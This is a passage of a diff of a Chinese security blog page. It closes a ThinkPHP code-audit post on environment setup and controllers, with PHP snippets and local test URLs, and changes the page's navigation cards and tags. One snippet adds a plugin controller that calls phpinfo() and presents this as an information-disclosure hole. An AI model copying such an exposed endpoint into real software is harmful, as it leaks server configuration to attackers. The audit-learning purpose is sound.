+        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>getArgs()：</p>
+<pre class="line-numbers language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">R</span><span class="token punctuation">(</span><span class="token string">"User/getArg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问</p>
+<pre><code>http://www.tp.cn/index.php/home/index/getargs/name/get
+
+post
+    name=post</code></pre><p><a href="https://imgtu.com/i/24nQts" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/06/12/24nQts.png" alt="24nQts.png"></a></p>
+<h3 id="插件控制器"><a href="#插件控制器" class="headerlink" title="插件控制器"></a>插件控制器</h3><p>插件控制器在 <strong>Application\Addon\</strong> 这里我创建了一个插件控制器模块PulgIn目录，在下面创建控制器目录Controller以及Info控制器，并且创建getPhpInfo() 方法：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">Addon<span class="token punctuation">\</span>PulgIn<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">InfoController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getPhpInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问（有点特殊）：</p>
+<pre><code>http://www.tp.cn/index.php/Home/info/getPhpInfo/addon/PulgIn
+地址 / 输入文件 / Home / 插件控制器 / 方法 / Addon / 插件控制器模块目录</code></pre><p>这样就成功拿到一个信息泄露的洞了…<br><a href="https://imgtu.com/i/24nqHg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/06/12/24nqHg.png" alt="24nqHg.png"></a></p>
 
             </div>
             <hr/>
@@ -1209,7 +1313,7 @@ CONTENT<span class="token operator">=</span><span class="token string">"0;url=da
                     </span>
                     <a href="https://Erikten.github.io" class="b-link-green">Erikten</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/posts/c882f53c.html" class="b-link-green">XSS绕过技术学习总结</a>
+                    <a href="/posts/c6be58a9.html" class="b-link-green">ThinkPHP框架代码审计——环境配置与控制器</a>
                 </p>
             </div>
 
@@ -1561,58 +1665,56 @@ CONTENT<span class="token operator">=</span><span class="token string">"0;url=da
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/5ff123fb.html">
+                <a href="/posts/c6be58a9.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/09.jpg" class="responsive-img" alt="内网渗透之环境搭建">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/01.jpg" class="responsive-img" alt="ThinkPHP框架代码审计——环境配置与控制器">
                         
-                        <span class="card-title">内网渗透之环境搭建</span>
+                        <span class="card-title">ThinkPHP框架代码审计——环境配置与控制器</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            工欲善其事必先利其器，先来搭建一下环境吧！
+                            ThinkPHP框架代码审计——环境配置与控制器
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-04-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-06-11
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/渗透测试篇/" class="post-category" target="_blank">
-                                    渗透测试篇
+                            <a href="/categories/代码审计篇/" class="post-category" target="_blank">
+                                    代码审计篇
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/渗透测试/" target="_blank">
-                        <span class="chip bg-color">渗透测试</span>
+                    <a href="/tags/代码审计/" target="_blank">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                    <a href="/tags/ThinkPHP/" target="_blank">
+                        <span class="chip bg-color">ThinkPHP</span>
                     </a>
                     
                     <a href="/tags/环境搭建/" target="_blank">
                         <span class="chip bg-color">环境搭建</span>
-                    </a>
-                    
-                    <a href="/tags/域渗透/" target="_blank">
-                        <span class="chip bg-color">域渗透</span>
-                    </a>
-                    
-                    <a href="/tags/内网渗透/" target="_blank">
-                        <span class="chip bg-color">内网渗透</span>
                     </a>
                     
                 </div>
@@ -1626,31 +1728,31 @@ CONTENT<span class="token operator">=</span><span class="token string">"0;url=da
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/31430522.html">
+                <a href="/posts/a8b7bd45.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/12.jpg" class="responsive-img" alt="Tomcat-Ajp协议任意文件读取漏洞复现（CVE-2020-1938）">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/10.jpg" class="responsive-img" alt="详解PHP中的面向对象（中）">
                         
-                        <span class="card-title">Tomcat-Ajp协议任意文件读取漏洞复现（CVE-2020-1938）</span>
+                        <span class="card-title">详解PHP中的面向对象（中）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            CVE-2020-1938 漏洞复现
+                            PHP开发基础
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-04-06
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-06-07
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/渗透测试篇/" class="post-category" target="_blank">
-                                    渗透测试篇
+                            <a href="/categories/PHP开发基础篇/" class="post-category" target="_blank">
+                                    PHP开发基础篇
                                 </a>
                             
                             
@@ -1660,20 +1762,16 @@ CONTENT<span class="token operator">=</span><span class="token string">"0;url=da
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞复现/" target="_blank">
-                        <span class="chip bg-color">漏洞复现</span>
+                    <a href="/tags/PHP/" target="_blank">
+                        <span class="chip bg-color">PHP</span>
                     </a>
                     
-                    <a href="/tags/渗透测试/" target="_blank">
-                        <span class="chip bg-color">渗透测试</span>
+                    <a href="/tags/编程/" target="_blank">
+                        <span class="chip bg-color">编程</span>
                     </a>
                     
-                    <a href="/tags/任意文件读取/" target="_blank">
-                        <span class="chip bg-color">任意文件读取</span>
-                    </a>
-                    
-                    <a href="/tags/Tomcat/" target="_blank">
-                        <span class="chip bg-color">Tomcat</span>
+                    <a href="/tags/安全开发/" target="_blank">
+                        <span class="chip bg-color">安全开发</span>
                     </a>
                     
                 </div>
